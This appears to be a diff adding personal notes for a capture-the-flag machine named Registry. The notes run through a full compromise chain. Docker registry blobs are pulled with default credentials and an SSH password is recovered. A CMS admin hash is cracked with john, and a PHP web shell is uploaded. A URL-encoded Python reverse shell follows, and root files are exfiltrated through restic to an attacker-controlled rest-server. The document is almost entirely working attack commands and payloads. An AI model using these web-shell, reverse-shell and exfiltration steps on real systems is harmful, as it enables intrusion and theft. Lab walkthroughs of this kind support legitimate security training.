@@ -1,0 +1,39 @@
+//based on MrR3boot and IppSec (PrivEsc)
+//nmap shows domain docker.registry.htb
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://docker.registry.htb/ -o gobuster_docker
+// /v2 has login admin:admin
+curl http://docker.registry.htb/v2/_catalog -H 'Authorization: Basic YWRtaW46YWRtaW4='
+curl http://docker.registry.htb/v2/bolt-image/tags/list -H 'Authorization: Basic YWRtaW46YWRtaW4='
+curl http://docker.registry.htb/v2/bolt-image/manifests/latest -H'Authorization: Basic YWRtaW46YWRtaW4='
+for a in `curl http://docker.registry.htb/v2/bolt-image/manifests/latest -H'Authorization: Basic YWRtaW46YWRtaW4=' | jq '.fsLayers|.[]|.blobSum' | tr -d '"'|cut -d ':' -f2`; do curl http://docker.registry.htb/v2/bolt-image/blobs/sha256:$a -H 'Authorization: Basic YWRtaW46YWRtaW4=' -o $a.gz; done
+//2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791 contains interestinginformation
+cat /root/.vminfo
+bolt:GkOcz221Ftb3ugog
+//got .ssh to login
+ssh -i id_rsa bolt@10.10.10.159		/got shell and user.txt
+
+//lateral movement
+/var/www/html/
+backup.php	//domain backup.registry.htb
+http://registry.htb/bolt/bolt/
+scp -i id_rsa bolt@registry.htb:/var/www/html/bolt/app/database/bolt.db .
+sqlite3 blot.db
+john hash --wordlist=rockyou.txt
+admin:$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK:strawberry
+
+http://registry.htb/bolt/bolt/file/edit/config/config.yml	//add php to allowed files
+http://registry.htb/bolt/bolt/files				//add php shell
+vim shell.php
+	<?php echo exec($_GET["cmd"]);?>
+nc -lvnp 1234	//on bolt
+http://registry.htb/bolt/files/shell.php?95df20efd5&cmd=/usr/bin/python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22127.0.0.1%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27	//get shell as www-data
+python -c 'import pty;pty.spawn("/bin/bash")'
+stty raw -echo	//and fg to get back, this to get functional shell(otherwise restic won't work)
+
+//PrivEsc
+//linpeas shows restic(backup sw) runs as admin
+mkdir data
+docker run -p 8000:8000 -v /root/Documents/htb/registry/data/:/data -it restic/rest-server sh
+restic backup -r rest:http://127.0.0.1:8000/ /root	//www-data
+mkdir restore
+restic -r data/ restore latest --target restore
